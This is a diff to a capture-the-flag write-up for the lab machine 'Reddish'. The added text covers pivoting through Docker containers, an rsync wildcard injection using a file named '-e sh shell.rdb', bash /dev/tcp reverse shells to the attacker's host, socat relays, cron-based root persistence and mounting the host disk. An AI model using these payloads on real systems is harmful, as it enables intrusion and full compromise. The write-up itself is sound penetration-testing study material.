@@ -300,6 +300,31 @@ socks5         127.0.0.1 1080
 #http           127.0.0.1 8080
 ```
 
+## Redis container - 172.19.0.2
+
+```bash
+$ proxychains nmap -sT -p 6379 -Pn -n 172.19.0.2           
+[proxychains] config file found: /etc/proxychains4.conf
+[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
+[proxychains] DLL init: proxychains-ng 4.17
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-22 23:01 PDT
+Nmap scan report for 172.19.0.2
+Host is up (0.29s latency).
+
+PORT     STATE SERVICE
+6379/tcp open  redis
+
+Nmap done: 1 IP address (1 host up) scanned in 0.38 seconds
+```
+
+```bash
+$ proxychains redis-cli -h 172.19.0.2
+[proxychains] config file found: /etc/proxychains4.conf
+[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
+[proxychains] DLL init: proxychains-ng 4.17
+172.19.0.2:6379>
+```
+
 ## Web server container - 172.19.0.4
 
 ```bash
@@ -324,59 +349,60 @@ The source code of the page shows some interesting js functions.
 ![webpage source code](images/proxy_webserver_sourcecode.png)
 
 ```html
+...
+<script type="text/javascript">
+                $(document).ready(function () {
+                        incrCounter();
+                    getData();
+                });
 
-        <script type="text/javascript">
-						$(document).ready(function () {
-								incrCounter();
-						    getData();
-						});
+                function getData() {
+                    $.ajax({
+                        url: "8924d0549008565c554f8128cd11fda4/ajax.php?test=get hits",
+                        cache: false,
+                        dataType: "text",
+                        success: function (data) {
+                                    console.log("Number of hits:", data)
+                        },
+                        error: function () {
+                        }
+                    });
+                }
 
-						function getData() {
-						    $.ajax({
-						        url: "8924d0549008565c554f8128cd11fda4/ajax.php?test=get hits",
-						        cache: false,
-						        dataType: "text",
-						        success: function (data) {
-											console.log("Number of hits:", data)
-						        },
-						        error: function () {
-						        }
-						    });
-						}
+                function incrCounter() {
+                    $.ajax({
+                        url: "8924d0549008565c554f8128cd11fda4/ajax.php?test=incr hits",
+                        cache: false,
+                        dataType: "text",
+                        success: function (data) {
+                        console.log("HITS incremented:", data);
+                        },
+                        error: function () {
+                        }
+                    });
+                }
 
-						function incrCounter() {
-						    $.ajax({
-						        url: "8924d0549008565c554f8128cd11fda4/ajax.php?test=incr hits",
-						        cache: false,
-						        dataType: "text",
-						        success: function (data) {
-				              console.log("HITS incremented:", data);
-						        },
-						        error: function () {
-						        }
-						    });
-						}
-
-						/*
-							* TODO
-							*
-							* 1. Share the web folder with the database container (Done)
-							* 2. Add here the code to backup databases in /f187a0ec71ce99642e4f0afbd441a68b folder
-							* ...Still don't know how to complete it...
-						*/
-						function backupDatabase() {
-								$.ajax({
-										url: "8924d0549008565c554f8128cd11fda4/ajax.php?backup=...",
-										cache: false,
-										dataType: "text",
-										success: function (data) {
-											console.log("Database saved:", data);
-										},
-										error: function () {
-										}
-								});
-						}
-		</script>
+                /*
+                    * TODO
+                    *
+                    * 1. Share the web folder with the database container (Done)
+                    * 2. Add here the code to backup databases in /f187a0ec71ce99642e4f0afbd441a68b folder
+                    * ...Still don't know how to complete it...
+                */
+                function backupDatabase() {
+                        $.ajax({
+                                url: "8924d0549008565c554f8128cd11fda4/ajax.php?backup=...",
+                                cache: false,
+                                dataType: "text",
+                                success: function (data) {
+                                    console.log("Database saved:", data);
+                                },
+                                error: function () {
+                                }
+                        });
+                }
+</script>
+...
 ```
 
 Trying to access the backup functions times out, and revel to us the path the files are located on the error msg.
@@ -385,31 +411,6 @@ Trying to access the backup functions times out, and revel to us the path the fi
 
 ```bash
 /var/www/html/8924d0549008565c554f8128cd11fda4/
-```
-
-## Redis container - 172.19.0.2
-
-```bash
-$ proxychains nmap -sT -p 6379 -Pn -n 172.19.0.2           
-[proxychains] config file found: /etc/proxychains4.conf
-[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
-[proxychains] DLL init: proxychains-ng 4.17
-Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-22 23:01 PDT
-Nmap scan report for 172.19.0.2
-Host is up (0.29s latency).
-
-PORT     STATE SERVICE
-6379/tcp open  redis
-
-Nmap done: 1 IP address (1 host up) scanned in 0.38 seconds
-```
-
-```bash
-$ proxychains redis-cli -h 172.19.0.2
-[proxychains] config file found: /etc/proxychains4.conf
-[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
-[proxychains] DLL init: proxychains-ng 4.17
-172.19.0.2:6379>
 ```
 
 On [HackTricks](https://book.hacktricks.xyz/network-services-pentesting/6379-pentesting-redis#redis-rce) we see a few options to upload a webshell to redis and access it from the web server.
@@ -565,35 +566,440 @@ id
 uid=33(www-data) gid=33(www-data) groups=33(www-data)
 ```
 
+After some enumeration, I noticed that `cron` is running on the container and that there is a `backup.sh` script scheduled to run as `root` every 3 min.
+
 ```bash
+www-data@www:/$ ps -ef
+ps -ef
+UID        PID  PPID  C STIME TTY          TIME CMD
+root         1     0  0 Aug22 ?        00:00:00 /bin/sh -c service cron start &&
+root        11     1  0 Aug22 ?        00:00:00 /usr/sbin/cron
+root        12     1  0 Aug22 ?        00:00:02 apache2 -DFOREGROUND
+...
 ```
 
 ```bash
+www-data@www:/$ ls -lha /etc/cron.d
+ls -lha /etc/cron.d
+total 16K
+drwxr-xr-x 1 root root 4.0K Jul 15  2018 .
+drwxr-xr-x 1 root root 4.0K Jul 15  2018 ..
+-rw-r--r-- 1 root root  102 Jun 11  2015 .placeholder
+-rw-r--r-- 1 root root   38 May  4  2018 backup
 ```
 
 ```bash
+www-data@www:/$ cat /etc/cron.d/backup
+cat /etc/cron.d/backup
+*/3 * * * * root sh /backup/backup.sh
 ```
 
 ```bash
+www-data@www:/$ cat /backup/backup.sh
+
+cd /var/www/html/f187a0ec71ce99642e4f0afbd441a68b
+rsync -a *.rdb rsync://backup:873/src/rdb/
+cd / && rm -rf /var/www/html/*
+rsync -a rsync://backup:873/src/backup/ /var/www/html/
+chown www-data. /var/www/html/f187a0ec71ce99642e4f0afbd441a68b
+```
+
+It seems the script is connecting to a host called `backup` on port `873`.
+
+The commands `nslookup` and `dig` are not available on the machine. `Ping` seems to be available only to the `root` user.
+
+Using `/dev/tcp/<HOST>/<PORT>` we see that the `backup` host is really responding on port `873`.
+
+```bash
+www-data@www:/$ echo > /dev/tcp/backup/873
+echo > /dev/tcp/backup/873
+
+www-data@www:/$ echo > /dev/tcp/backup/876
+echo > /dev/tcp/backup/876
+bash: connect: Connection refused
+bash: /dev/tcp/backup/876: Connection refused
+```
+
+Listing the IPs configured on the container we see that we have 2 nics and an new IP range we didn't see before - `10.20.0.3`
+
+```bash
+www-data@www:/$ ip a | grep inet
+ip a | grep inet
+    inet 127.0.0.1/8 scope host lo
+    inet 172.19.0.4/16 brd 172.19.255.255 scope global eth0
+    inet 172.20.0.3/16 brd 172.20.255.255 scope global eth1
+```
+
+On `arp` we see the IP `172.20.0.2`.
+
+```bash
+www-data@www:/$ cat /proc/net/arp
+cat /proc/net/arp
+IP address       HW type     Flags       HW address            Mask     Device
+172.19.0.2       0x1         0x2         02:42:ac:13:00:02     *        eth0
+172.19.0.3       0x1         0x2         02:42:ac:13:00:03     *        eth0
+172.20.0.2       0x1         0x2         02:42:ac:14:00:02     *        eth1
+```
+
+And if we test the port `873` on it, it returns as responding.
+
+```bash
+www-data@www:/$ echo > /dev/tcp/172.20.0.2/873
+echo > /dev/tcp/172.20.0.2/873
+```
+
+It would like something like this:
+
+![Reddish diagrama](images/reddish_backup_container.png)
+
+Ok, we kind of know now that `backup` seems to be `172.20.0.2`. It does not make a lot of difference, but it is good to know.
+
+Back to the script we see an interesting line with a wild card that we may be able to take advantage of.
+
+```bash
+...
+rsync -a *.rdb rsync://backup:873/src/rdb/
+...
+```
+
+From what it looks like, we rename a `.rdb` file to include some valid `rsync` parameters and it will run. To make things better for us, `rsync` seems to have a parameter that execute commands.
+
+```bash
+$ man rsync
+...
+    --rsh=COMMAND, -e        specify the remote shell to use
+...
+```
+
+We could create a file called `-e sh shell.rdb` and it may be replaced by the wildcard as valid parameter. It would be interpreted as something like the following. The technique is detailed [here](https://www.exploit-db.com/papers/33930).
+
+```bash
+rsync -a -e sh shell.rdb rsync://backup:873/src/rdb/
+```
+
+Lets play with this strategy and try to get a revese shell as root here. For that lets set another port forwarder on `node-RED` with `socat` redirecting the traffic to our Kali.
+
+```bash
+root@nodered:/tmp# /tmp/socat-static tcp-listen:6666,fork tcp:10.10.14.8:6666 &
+/tmp/socat-static tcp-listen:6666,fork tcp:10.10.14.8:6666 &
+[2] 1725
+```
+
+And start a listener on Kali.
+
+```bash
+$ rlwrap -cAr nc -nlvp 6666
+listening on [any] 6666 ...
+```
+
+Now we add our payload on a `.rdb` file.
+
+```bash
+www-data@www:/tmp$ echo "bash -c 'bash -i >& /dev/tcp/172.19.0.3/6666 0>&1' &" > shell.rdb
+<sh -c 'bash -i >& /dev/tcp/172.19.0.3/6666 0>&1' &" > shell.rdb
 ```
 
 ```bash
+www-data@www:/tmp$ cat shell.rdb
+bash -c 'bash -i >& /dev/tcp/172.19.0.3/6666 0>&1' &
+```
+
+With all ready, we now copy our file to the directory the script is checking.
+
+```bash
+www-data@www:/tmp$ cp shell.rdb /var/www/html/f187a0ec71ce99642e4f0afbd441a68b/shell.rdb
+<.rdb /var/www/html/f187a0ec71ce99642e4f0afbd441a68b/shell.rdb  
+```
+
+Then we create a file with the trick name.
+
+```bash
+www-data@www:/tmp$ touch /var/www/html/f187a0ec71ce99642e4f0afbd441a68b/-e\ sh\ shell.rdb
+<ar/www/html/f187a0ec71ce99642e4f0afbd441a68b/-e\ sh\ shell.rdb
 ```
 
 ```bash
+www-data@www:/tmp$ ls -lha /var/www/html/f187a0ec71ce99642e4f0afbd441a68b
+ls -lha /var/www/html/f187a0ec71ce99642e4f0afbd441a68b
+total 12K
+-rw-r--r-- 1 www-data www-data    0 Aug 24 06:24 -e sh shell.rdb
+drwxr-xr-x 2 www-data www-data 4.0K Aug 24 06:24 .
+drwxr-xr-x 5 root     root     4.0K Jul 15  2018 ..
+-rw-r--r-- 1 www-data www-data   53 Aug 24 06:24 shell.rdb
+```
+
+After a couple of minutes we get a shell.
+
+```bash
+$ rlwrap -cAr nc -nlvp 6666
+listening on [any] 6666 ...
+connect to [10.10.14.8] from (UNKNOWN) [10.10.10.94] 59666
+bash: cannot set terminal process group (8987): Inappropriate ioctl for device
+bash: no job control in this shell
+root@www:/var/www/html/f187a0ec71ce99642e4f0afbd441a68b# id
+id
+uid=0(root) gid=0(root) groups=0(root)
+```
+
+Finally we get our 1st flag.
+
+```bash
+root@www:/tmp# cat /home/somaro/user.txt
+cat /home/somaro/user.txt
+6f5ab9...
+```
+
+## Backup container - 172.20.0.2
+
+Using `rsync` I have access to `backup` container.
+
+```bash
+root@www:/tmp# rsync rsync://backup:873/src
+rsync rsync://backup:873/src
+drwxr-xr-x          4,096 2018/07/15 17:42:39 .
+-rwxr-xr-x              0 2018/05/04 21:01:30 .dockerenv
+-rwxr-xr-x            100 2018/05/04 19:55:07 docker-entrypoint.sh
+drwxr-xr-x          4,096 2018/07/15 17:42:41 backup
+drwxr-xr-x          4,096 2018/07/15 17:42:39 bin
+drwxr-xr-x          4,096 2018/07/15 17:42:38 boot
+drwxr-xr-x          4,096 2018/07/15 17:42:39 data
+drwxr-xr-x          3,640 2024/08/22 21:39:22 dev
+drwxr-xr-x          4,096 2018/07/15 17:42:39 etc
+drwxr-xr-x          4,096 2018/07/15 17:42:38 home
+drwxr-xr-x          4,096 2018/07/15 17:42:39 lib
+drwxr-xr-x          4,096 2018/07/15 17:42:38 lib64
+drwxr-xr-x          4,096 2018/07/15 17:42:38 media
+drwxr-xr-x          4,096 2018/07/15 17:42:38 mnt
+drwxr-xr-x          4,096 2018/07/15 17:42:38 opt
+dr-xr-xr-x              0 2024/08/22 21:39:22 proc
+drwxr-xr-x          4,096 2018/07/15 17:42:39 rdb
+drwx------          4,096 2018/07/15 17:42:38 root
+drwxr-xr-x          4,096 2024/08/22 21:39:23 run
+drwxr-xr-x          4,096 2018/07/15 17:42:38 sbin
+drwxr-xr-x          4,096 2018/07/15 17:42:38 srv
+dr-xr-xr-x              0 2024/08/24 03:37:14 sys
+drwxrwxrwt          4,096 2024/08/24 07:07:01 tmp
+drwxr-xr-x          4,096 2018/07/15 17:42:39 usr
+drwxr-xr-x          4,096 2018/07/15 17:42:39 var
+```
+
+And I can upload files to it.
+
+```bash
+root@www:/tmp# rsync shell.rdb rsync://backup:873/src/tmp
+rsync shell.rdb rsync://backup:873/src/tmp
+
+root@www:/tmp# rsync rsync://backup:873/src/tmp/
+rsync rsync://backup:873/src/tmp/
+drwxrwxrwt          4,096 2024/08/24 07:10:01 .
+-rw-r--r--             53 2024/08/24 07:09:50 shell.rdb
+```
+
+Ok! There are too many hops here to try to connect back direct to our Kali. Instead I believe would be easier to transfer `socat` to the web server, and try to get a reverse shell there.
+
+To do that, we can again use `socat` on `nodered` to redirect a port to the port we have our web server serving files on Kali.
+
+```bash
+root@nodered:/tmp# /tmp/socat-static tcp-listen:8181,fork tcp:10.10.14.8:8181 &
+/tmp/socat-static tcp-listen:8181,fork tcp:10.10.14.8:8181 &
+[3] 1733
+```
+
+Then, from the `www` web server, we use our perl oneliner to download the `socat-static`.
+
+```bash
+root@www:/tmp# perl -MHTTP::Tiny -e '$http = HTTP::Tiny->new; $http->mirror("http://172.19.0.3:8181/socat-static", "socat-static");'
+<tp://172.19.0.3:8181/socat-static", "socat-static");'
 ```
 
 ```bash
+$ python3 -m http.server 8181
+Serving HTTP on 0.0.0.0 port 8181 (http://0.0.0.0:8181/) ...
+...
+10.10.10.94 - - [23/Aug/2024 14:41:03] "GET /socat-static HTTP/1.1" 200 -
+```
+
+Then we grant it execution permission.
+
+```bash
+root@www:/tmp# chmod +x socat-static
+chmod +x socat-static
+```
+
+Now, we can try to build a cron job on the `backup` server to connect back to `socat` on `www`.
+
+First, lets create a shell script with our payload.
+
+```bash
+root@www:/tmp# echo "bash -c 'bash -i >& /dev/tcp/172.20.0.3/9010 0>&1' &" > shell.sh
+<c 'bash -i >& /dev/tcp/172.20.0.3/9010 0>&1' &" > shell.sh
 ```
 
 ```bash
+root@www:/tmp# cat /tmp/shell.sh
+bash -c 'bash -i >& /dev/tcp/172.20.0.3/9010 0>&1' &
+```
+
+And transfer it to the tmp directory on `backup`.
+
+```bash
+root@www:/tmp# rsync -a shell.sh rsync://backup:873/src/tmp/
+rsync -a shell.sh rsync://backup:873/src/tmp/
+```
+
+Then we create the cron job file calling our scritp.
+
+```bash
+root@www:/tmp# echo '* * * * * root sh /tmp/shell.sh' > shell
+echo '* * * * * root sh /tmp/shell.sh' > shell
 ```
 
 ```bash
+root@www:/tmp# cat /tmp/shell
+* * * * * root sh /tmp/shell.sh
+```
+
+And transfer it to the `cron.d` directory on `backup`.
+
+```bash
+root@www:/tmp# rsync -a shell rsync://backup:873/src/etc/cron.d/
+rsync -a shell rsync://backup:873/src/etc/cron.d/
+```
+
+Now we start our `socat` listener on `www`.
+
+```bash
+root@www:/tmp# /tmp/socat-static TCP-LISTEN:9010 STDOUT
+/tmp/socat-static TCP-LISTEN:9010 STDOUT
+```
+
+In a minute we get the shell.
+
+```bash
+root@www:/tmp# /tmp/socat-static TCP-LISTEN:9010 STDOUT
+/tmp/socat-static TCP-LISTEN:9010 STDOUT
+bash: cannot set terminal process group (8498): Inappropriate ioctl for device
+bash: no job control in this shell
+
+root@backup:~# id
+uid=0(root) gid=0(root) groups=0(root)
+
+root@backup:~# hostname
+backup
+```
+
+## Reddish - shell
+
+During the enumeration here, we noticed that one this container we seem to be able to see more things on `/dev` directory.
+
+```bash
+root@backup:~# ls /dev/ | wc -l
+180
+```
+
+Compared with the `www` container
+
+```bash
+root@www:/tmp# ls /dev/ | wc -l
+15
+```
+
+It seems we may have access to the local disks of the `reddish` machine here.
+
+```bash
+root@backup:~# ls -lha /dev/sda*
+
+brw-rw---- 1 root disk 8, 0 Aug 22 21:39 /dev/sda
+brw-rw---- 1 root disk 8, 1 Aug 22 21:39 /dev/sda1
+brw-rw---- 1 root disk 8, 2 Aug 22 21:39 /dev/sda2
+brw-rw---- 1 root disk 8, 3 Aug 22 21:39 /dev/sda3
 ```
 
 ```bash
+root@backup:~# mount /dev/sda2 /mnt
+mount /dev/sda2 /mnt
 ```
 
 ```bash
+root@backup:~# ls -lha /mnt
+
+total 128K
+drwxr-xr-x  23 root root 4.0K Dec  6  2023 .
+drwxr-xr-x   1 root root 4.0K Jul 15  2018 ..
+drwxr-xr-x   2 root root  12K Dec  6  2023 bin
+drwxr-xr-x   2 root root 4.0K Jul 15  2018 boot
+drwxr-xr-x   4 root root 4.0K Jul 15  2018 dev
+drwxr-xr-x 100 root root  12K Dec  6  2023 etc
+drwxr-xr-x   5 root root 4.0K Apr  9  2021 home
+lrwxrwxrwx   1 root root   34 Dec  6  2023 initrd.img -> boot/initrd.img-4.15.0-213-generic
+lrwxrwxrwx   1 root root   33 Dec  6  2023 initrd.img.old -> boot/initrd.img-4.4.0-130-generic
+drwxr-xr-x  24 root root 4.0K Dec  6  2023 lib
+drwxr-xr-x   2 root root 4.0K Dec  6  2023 lib64
+drwx------   2 root root  16K Apr  1  2018 lost+found
+drwxr-xr-x   3 root root 4.0K Jul 15  2018 media
+drwxr-xr-x   2 root root 4.0K Jul 15  2018 mnt
+drwxr-xr-x   3 root root 4.0K Jul 15  2018 opt
+drwxr-xr-x   2 root root 4.0K Jul 15  2018 proc
+drwx------   5 root root 4.0K Aug 22 21:44 root
+drwxr-xr-x   2 root root 4.0K Jul 15  2018 run
+drwxr-xr-x   2 root root  12K Dec  6  2023 sbin
+drwxr-xr-x   2 root root 4.0K Jul 15  2018 snap
+drwxr-xr-x   2 root root 4.0K Jul 15  2018 srv
+drwxr-xr-x   2 root root 4.0K Jul 15  2018 sys
+drwxrwxrwt  11 root root 4.0K Aug 23 22:52 tmp
+drwxr-xr-x  10 root root 4.0K Jul 15  2018 usr
+drwxr-xr-x  13 root root 4.0K Jul 15  2018 var
+lrwxrwxrwx   1 root root   31 Dec  6  2023 vmlinuz -> boot/vmlinuz-4.15.0-213-generic
+lrwxrwxrwx   1 root root   30 Dec  6  2023 vmlinuz.old -> boot/vmlinuz-4.4.0-130-generic
+```
+
+With access to the main partition and could use the same cron job strategy here to, this time, connect back direct to our Kali.
+
+```bash
+root@backup:~# echo "bash -c 'bash -i >& /dev/tcp/10.10.14.8/9008 0>&1' &" > /mnt/tmp/shell.sh
+<c 'bash -i >& /dev/tcp/10.10.14.8/9008 0>&1' &" > /mnt/tmp/shell.sh
+```
+
+```bash
+root@backup:~# cat /mnt/tmp/shell.sh
+bash -c 'bash -i >& /dev/tcp/10.10.14.8/9008 0>&1' &
+```
+
+Then the cron job file.
+
+```bash
+root@backup:~# echo '* * * * * root sh /tmp/shell.sh' > /mnt/etc/cron.d/shell
+echo '* * * * * root sh /tmp/shell.sh' > /mnt/etc/cron.d/shell
+```
+
+```bash
+root@backup:~# cat /mnt/etc/cron.d/shell
+* * * * * root sh /tmp/shell.sh
+```
+
+```bash
+root@backup:~# ls -lha /mnt/etc/cron.d/shell
+-rw-r--r-- 1 root root 32 Aug 24 07:59 /mnt/etc/cron.d/shell
+```
+
+And then we start a listener on Kali and in a minute we get a shell.
+
+```bash
+$ rlwrap -cAr nc -nlvp 9008
+listening on [any] 9008 ...
+connect to [10.10.14.8] from (UNKNOWN) [10.10.10.94] 34202
+bash: cannot set terminal process group (5250): Inappropriate ioctl for device
+bash: no job control in this shell
+
+root@reddish:~# id
+id
+uid=0(root) gid=0(root) groups=0(root)
+```
+
+Finally we have a shell and can get the root flag.
+
+```bash
+root@reddish:~# cat /root/root.txt
+cat /root/root.txt
+ee6dfa...
 ```
